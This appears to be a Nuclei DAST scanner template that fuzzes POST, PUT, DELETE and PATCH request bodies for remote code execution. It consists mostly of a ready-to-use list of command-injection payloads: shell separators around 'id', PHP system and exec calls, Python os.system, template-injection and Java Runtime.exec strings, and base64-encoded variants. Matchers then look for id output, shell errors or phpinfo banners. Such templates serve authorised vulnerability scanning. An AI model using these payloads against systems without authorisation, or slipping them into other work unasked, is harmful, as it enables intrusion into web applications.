id: rce-body-replace

info:
  name: Remote Code Execution
  author: reewardius
  severity: critical
  tags: fuzzing-req,fuzzing-req-rce,fuzzing-req-body-query,fuzzing-req-rce-body-query,fuzzing-req-body,rce,dast
  
http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "POST"'
          - 'method == "PUT"'
          - 'method == "DELETE"'
          - 'method == "PATCH"'
        
    payloads:
      rce:
        - "$(id)"
        - "%2560id%2560"
        - "%26id%26"
        - "%60id%60"
        - "& `id`"
        - "& id &"
        - "& id"
        - "&$(id)"
        - "&& id"
        - "&&$(id)"
        - "&&`id`"
        - "&&id"
        - "&&id&&"
        - "&`id`"
        - "&id"
        - "&id&"
        - "'.system('id').'"
        - "'.system('perl -v').'"
        - "'i'd"
        - "'id'"
        - ");id"
        - ");id;"
        - ");id|"
        - ")id "
        - ")|id"
        - ")|id;"
        - "**id**"
        - "*id"
        - "*id*"
        - "/*$(id)`id`"
        - "1;id"
        - "; $(id)"
        - "; `id` #"
        - "; `id`"
        - "; id"
        - "; id;"
        - "; id\n"
        - "; id|"
        - "; |id|"
        - "Exception('id'.execute().text)"
        - "\n&&id"
        - "\n;id"
        - "\nid"
        - "\nid\n"
        - "\n||$(id)"
        - "\n||`id`"
        - "\n||id"
        - "\r&&id"
        - "\r;id"
        - "\r\n&&id&&"
        - "\r\n;id"
        - "\r\n||$(id)"
        - "\r\n||`id`"
        - "\r\n||id"
        - "\r\n||id||"
        - "\r||$(id)"
        - "\r||`id`"
        - "\r||id"
        - "`id`"
        - "`id`#"
        - "`id`&"
        - "a);id"
        - "a);id|"
        - "a;id"
        - "a;id;"
        - "i`u`d"
        - "id"
        - "id;"
        - "id|"
        - "import os;os.system('id');"
        - "{% import os %}{{os.system('id')"
        - "| `id` #"
        - "| `id`"
        - "| id"
        - "|id"
        - "|id;"
        - "|id|"
        - "|| `id` #"
        - "|| `id`"
        - "|| id"
        - "||$(id)"
        - "||$(id);"
        - "||$(id)||"
        - "||`id`"
        - "||`id`||"
        - "||id"
        - "||id;"
        - "||id|"
        - "||id||"
        - '"><?php echo system("id");?>'
        - '"i"d'
        - '$;id'
        - '; echo `id`;'
        - '; echo exec(id);'
        - ';";id'
        - ';";id;'
        - '<%25+system("id")+%25>'
        - '<%= system("id") %>'
        - '<?php escapeshellcmd("id"); ?>'
        - '<?php exec("id"); ?>'
        - '<?php shell_exec("id"); ?>'
        - '<?php system("id"); ?>'
        - 'JiZpZCYm'
        - 'O2BpZGA7'
        - 'O2lkOw=='
        - 'T(java.lang.Runtime).getRuntime().exec("id")'
        - 'YGlkYA=='
        - '`/usr/bin/id`'
        - 'echo `id`;'
        - 'echo exec(id);'
        - 'fHxgaWRgfHw='
        - 's:19:"<?php phpinfo(); ?>";'
        - '||/usr/bin/id||'
        - "johnsmith@{{Host}}'.system('id').'"
        
    fuzzing:
      - part: body
        type: replace
        mode: single
        fuzz:
          - "{{rce}}"
          
    stop-at-first-match: true
    matchers-condition: or
    matchers:
      # Строгая проверка формата вывода команды id (Unix/Linux)
      - type: regex
        part: body
        regex:
          # uid=NUMBER(username) gid=NUMBER(groupname)
          - 'uid=\d+\([a-zA-Z0-9_-]+\)\s+gid=\d+\([a-zA-Z0-9_-]+\)'
          # uid=NUMBER(username) gid=NUMBER(groupname) groups=...
          - 'uid=\d+\([^)]+\).*gid=\d+\([^)]+\).*groups='
        condition: or
        
      # Windows ошибка (доказательство попытки выполнения)
      - type: word
        part: body
        words:
          - "'id' is not recognized as an internal or external command"
          - "'id' не является внутренней или внешней командой"
        
      # Bash ошибка синтаксиса (доказательство интерпретации команды)
      - type: regex
        part: body
        regex:
          - 'syntax error near unexpected token.*id'
          - 'sh:.*id.*not found'
          
      # PHP info (для PHP RCE payloads)
      - type: regex
        part: body
        regex:
          - 'PHP Version\s+\d+\.\d+\.\d+'
          
      - type: word
        words:
          - "This is perl"
          
    extractors:
      - type: regex
        part: body
        regex:
          - 'uid=\d+\([^)]+\).*gid=\d+\([^)]+\).*'
        group: 0